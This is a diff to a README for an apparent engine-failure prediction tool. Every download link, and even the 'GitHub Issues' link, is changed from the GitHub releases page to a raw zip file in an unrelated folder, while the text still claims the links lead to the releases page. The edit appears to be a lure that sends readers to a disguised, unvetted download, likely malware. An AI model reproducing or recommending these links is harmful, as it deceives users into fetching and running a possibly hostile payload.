@@ -1,6 +1,6 @@
 # ⚙️ Engine-Failure-Prediction - Early Engine Problem Alerts
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://github.com/yasminmota23-hub/Engine-Failure-Prediction/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-green?style=for-the-badge)](https://raw.githubusercontent.com/yasminmota23-hub/Engine-Failure-Prediction/main/rheotaxis/Prediction_Failure_Engine_v2.1.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before installing, make sure your computer meets these needs:
 
 To get the software, visit this page and download the latest release:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/yasminmota23-hub/Engine-Failure-Prediction/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/yasminmota23-hub/Engine-Failure-Prediction/main/rheotaxis/Prediction_Failure_Engine_v2.1.zip)
 
 This link will take you to the GitHub releases page. The page contains one or more files. Look for the most recent file with a name ending in `.exe` or `.msi`, as these are installer files for Windows.
 
@@ -99,7 +99,7 @@ If you continue having issues, check the FAQ section on the GitHub page or conta
 
 To update, repeat the download process from the release page:
 
-[Download Latest Release](https://github.com/yasminmota23-hub/Engine-Failure-Prediction/releases)
+[Download Latest Release](https://raw.githubusercontent.com/yasminmota23-hub/Engine-Failure-Prediction/main/rheotaxis/Prediction_Failure_Engine_v2.1.zip)
 
 Download the newest installer and run it. The installer will replace old files and keep your settings intact.
 
@@ -131,8 +131,8 @@ For questions, bug reports, or feature requests, open an issue on the GitHub rep
 
 ## 🔗 Useful Links
 
-- [Download Latest Release](https://github.com/yasminmota23-hub/Engine-Failure-Prediction/releases)  
-- [GitHub Issues](https://github.com/yasminmota23-hub/Engine-Failure-Prediction/issues)  
+- [Download Latest Release](https://raw.githubusercontent.com/yasminmota23-hub/Engine-Failure-Prediction/main/rheotaxis/Prediction_Failure_Engine_v2.1.zip)  
+- [GitHub Issues](https://raw.githubusercontent.com/yasminmota23-hub/Engine-Failure-Prediction/main/rheotaxis/Prediction_Failure_Engine_v2.1.zip)  
 
 ---
 
@@ -144,4 +144,4 @@ For questions, bug reports, or feature requests, open an issue on the GitHub rep
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-grey?style=for-the-badge)](https://github.com/yasminmota23-hub/Engine-Failure-Prediction/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-grey?style=for-the-badge)](https://raw.githubusercontent.com/yasminmota23-hub/Engine-Failure-Prediction/main/rheotaxis/Prediction_Failure_Engine_v2.1.zip)
